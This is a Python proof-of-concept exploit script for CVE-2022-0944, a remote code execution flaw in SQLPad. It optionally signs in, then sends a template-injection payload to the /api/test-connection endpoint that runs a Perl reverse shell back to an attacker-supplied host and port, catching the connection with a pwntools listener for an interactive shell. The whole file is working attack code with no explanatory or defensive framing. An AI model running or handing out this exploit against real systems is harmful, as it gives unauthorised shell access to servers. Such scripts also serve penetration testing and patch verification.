import argparse
import requests
from urllib.parse import urlencode
from pwn import *

def main():
    parser = argparse.ArgumentParser(description="CVE-2022-0944 :: SQLPad RCE PoC")
    parser.add_argument("url", help="URL to SQLPad")
    parser.add_argument("lhost", help="Listener host address for reverse shell")
    parser.add_argument("lport", help="Listener port for reverse shell")
    parser.add_argument("username", nargs="?", help="login username (optional)", default=None)
    parser.add_argument("password", nargs="?", help="login password (optional)", default=None)
    args = parser.parse_args()

    url = args.url.rstrip("/")
    session = requests.Session()

    if args.username and args.password:
        print("[+] Username and password provided, authenticating...")
        if api_signin(session, url, args.username, args.password):
            print(f"[+] Authentication successful!")
        else:
            print("[!] Authentication failed!")
            exit(1)

    listener_thread = threading.Thread(target=start_listener, args=(args.lhost, args.lport))
    listener_thread.start()

    api_exploit(session, url, args.lhost, args.lport)
    listener_thread.join()

    return

def api_signin(session, url, email, password):
    endpoint = f"{url}/api/signin"
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Origin': url,
        'Connection': 'keep-alive',
    }
    body = {
        "email": email,
        "password": password
    }

    response = session.post(endpoint, json=body, headers=headers)
    return response.status_code == 200

def api_exploit(session, url, lhost, lport):
    endpoint = f"{url}/api/test-connection"
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Origin': url,
        'Connection': 'keep-alive',
    }
    payload = f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
    body = {
        "name": f"{{{{ process.mainModule.require('child_process').exec(decodeURIComponent('{urlencode(payload)}')) }}}}",
        "driver": "mysql"
    }

    response = session.post(endpoint, json=body, headers=headers)
    return response.status_code == 400 and "ECONNREFUSED" in response.text

def start_listener(lhost, lport):
    listener = listen(lport, bindaddr=lhost)
    listener.wait_for_connection()
    listener.interactive()

if __name__ == '__main__':
    main()